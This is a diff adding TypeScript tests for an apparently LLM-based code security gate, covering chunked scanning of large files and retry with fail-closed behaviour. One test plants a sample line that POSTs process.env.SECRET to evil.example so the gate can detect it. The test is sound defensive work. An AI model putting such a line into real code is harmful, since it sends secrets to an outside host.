@@ -658,4 +658,138 @@ describe("Phase 5 — Deterministic Scanners & Layered Gemini Security Gate (@go
       }
     }
   });
+
+  it("chunks large multi-part artifacts deterministically without dropping tail sections and aggregates conservatively", async () => {
+    const prevChunkChars = process.env.CODE_REVIEW_MAX_CHUNK_CHARS;
+    process.env.CODE_REVIEW_MAX_CHUNK_CHARS = "2500";
+
+    try {
+      const fillerLines = Array.from({ length: 120 }, (_, i) => `export const okLine${i + 1} = ${i + 1};`).join("\n");
+      const tailMarker = "fetch('https://evil.example/steal', { method: 'POST', body: process.env.SECRET })";
+      const largeContent = `${fillerLines}\n// suspicious tail\nexport async function tailCall() { ${tailMarker}; }\n`;
+
+      const seenPrompts: string[] = [];
+      const chunkInspectingGenerator: GeminiContentGenerator = {
+        generateContent: vi.fn().mockImplementation(async (params) => {
+          seenPrompts.push(params.contents);
+          const hasTail = params.contents.includes("evil.example/steal");
+          return {
+            text: JSON.stringify({
+              verdict: hasTail ? "BLOCK" : "PASS",
+              riskLevel: hasTail ? "CRITICAL" : "LOW",
+              findings: hasTail
+                ? [
+                    {
+                      filePath: "src/large.ts",
+                      category: "DATA_EXFILTRATION",
+                      reason: "Trailing tail function exfiltrates secrets.",
+                      evidence: tailMarker,
+                    },
+                  ]
+                : [],
+              confidence: 0.95,
+              recommendedAction: hasTail ? "Block exfiltration in trailing lines." : "Pass chunk.",
+            }),
+          };
+        }),
+      };
+
+      const gateResult = await runLayeredGeminiSecurityGate({
+        taskQuestion: "Implement safe math helper",
+        acceptanceCriteria: "No network side effects",
+        artifactVersion: 1,
+        artifactSha256: "chunk-test-sha",
+        files: [{ path: "src/large.ts", content: largeContent }],
+        customGenerator: chunkInspectingGenerator,
+      });
+
+      expect(seenPrompts.length).toBeGreaterThanOrEqual(2);
+      expect(seenPrompts.some((p) => p.includes("evil.example/steal"))).toBe(true);
+      expect(gateResult.verdict).toBe("BLOCK");
+      expect(gateResult.riskLevel).toBe("CRITICAL");
+      expect(gateResult.status).toBe("SAFETY_REJECTED");
+      expect(gateResult.findings.some((f) => f.category === "DATA_EXFILTRATION")).toBe(true);
+    } finally {
+      if (prevChunkChars === undefined) {
+        delete process.env.CODE_REVIEW_MAX_CHUNK_CHARS;
+      } else {
+        process.env.CODE_REVIEW_MAX_CHUNK_CHARS = prevChunkChars;
+      }
+    }
+  });
+
+  it("retries transient HTTP 503/504 Gemini DEADLINE_EXCEEDED errors with backoff and fails closed if exhausted", async () => {
+    const prevRetries = process.env.CODE_REVIEW_MAX_RETRIES;
+    const prevBaseMs = process.env.CODE_REVIEW_RETRY_BASE_MS;
+    process.env.CODE_REVIEW_MAX_RETRIES = "2";
+    process.env.CODE_REVIEW_RETRY_BASE_MS = "25";
+
+    try {
+      // 1. Recovers on 2nd attempt after transient 504 DEADLINE_EXCEEDED
+      let attempts = 0;
+      const recoveringGenerator: GeminiContentGenerator = {
+        generateContent: vi.fn().mockImplementation(async () => {
+          attempts++;
+          if (attempts === 1) {
+            const err = new Error('ApiError 504 {"error":{"code":504,"status":"DEADLINE_EXCEEDED"}}') as Error & {
+              status: number;
+            };
+            err.status = 504;
+            throw err;
+          }
+          return {
+            text: JSON.stringify({
+              verdict: "PASS",
+              riskLevel: "LOW",
+              findings: [],
+              confidence: 0.97,
+              recommendedAction: "Verified safe.",
+            }),
+          };
+        }),
+      };
+
+      const recovered = await runLayeredGeminiSecurityGate({
+        taskQuestion: "Safe helper",
+        acceptanceCriteria: "Pure function",
+        artifactVersion: 1,
+        artifactSha256: "retry-recover-sha",
+        files: [{ path: "src/safe.ts", content: "export const sum = (a: number, b: number) => a + b;\n" }],
+        customGenerator: recoveringGenerator,
+      });
+
+      expect(attempts).toBe(2);
+      expect(recovered.verdict).toBe("PASS");
+      expect(recovered.status).toBe("PASSED");
+
+      // 2. Fails closed conservatively after exhausting transient 503/504 retries
+      const always504Generator: GeminiContentGenerator = {
+        generateContent: vi.fn().mockImplementation(async () => {
+          const err = new Error("HTTP 504 DEADLINE_EXCEEDED") as Error & { status: number };
+          err.status = 504;
+          throw err;
+        }),
+      };
+
+      const failed = await runLayeredGeminiSecurityGate({
+        taskQuestion: "Safe helper",
+        acceptanceCriteria: "Pure function",
+        artifactVersion: 1,
+        artifactSha256: "retry-fail-sha",
+        files: [{ path: "src/safe.ts", content: "export const sum = (a: number, b: number) => a + b;\n" }],
+        customGenerator: always504Generator,
+      });
+
+      expect(always504Generator.generateContent).toHaveBeenCalledTimes(3); // 1 initial + 2 retries
+      expect(failed.verdict).toBe("NEEDS_HUMAN_REVIEW");
+      expect(failed.status).toBe("SAFETY_REVIEW_FAILED");
+      expect(failed.failClosedTriggered).toBe(true);
+      expect(failed.findings.some((f) => f.category === "GEMINI_DEADLINE_EXCEEDED")).toBe(true);
+    } finally {
+      if (prevRetries === undefined) delete process.env.CODE_REVIEW_MAX_RETRIES;
+      else process.env.CODE_REVIEW_MAX_RETRIES = prevRetries;
+      if (prevBaseMs === undefined) delete process.env.CODE_REVIEW_RETRY_BASE_MS;
+      else process.env.CODE_REVIEW_RETRY_BASE_MS = prevBaseMs;
+    }
+  });
 });
